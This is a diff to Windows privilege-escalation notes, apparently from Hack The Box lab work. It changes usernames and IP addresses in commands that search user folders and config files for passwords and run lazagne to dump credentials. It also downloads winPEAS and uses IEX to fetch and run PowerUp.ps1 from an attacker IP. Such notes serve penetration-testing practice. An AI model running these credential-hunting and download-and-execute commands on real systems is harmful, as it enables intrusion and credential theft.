@@ -57,7 +57,7 @@ gci -Path C:\inetpub\wwwroot -Include *.txt,*.ini,*.yml,*.config -File -Recurse 
 gci -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml*,.config,*.sqlite -File -Recurse -ErrorAction SilentlyContinue
 gci -h -Path C:\Users\ -Include *.exe,*.txt,*.rdp,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx,*.ps1,*.bat,*.ini,*.yml,*.config,*.sqlite -File -Recurse -ErrorAction SilentlyContinue
 gci C:\Users\Public
-gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+gc 'C:\Users\svc-alfresco\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
 
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 findstr /spin "password" *.*
@@ -84,12 +84,12 @@ lazagne.exe /all
 ```
 3. Run PEAS,
 ```powershell
-curl 192.168.45.x/winPEAS.exe -o winpeas.exe
+iwr 10.10.14.18/winPEASx64.exe -o winpeas.exe
 .\winpeas.exe
 ```
 4. PowerUp
 ```powershell
-IEX(New-Object Net.WebClient).downloadString('http://192.168.45.x/PowerUp.ps1');Invoke-Allchecks
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18/PowerUp.ps1');Invoke-Allchecks
 ```
 5. Running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester
 ```
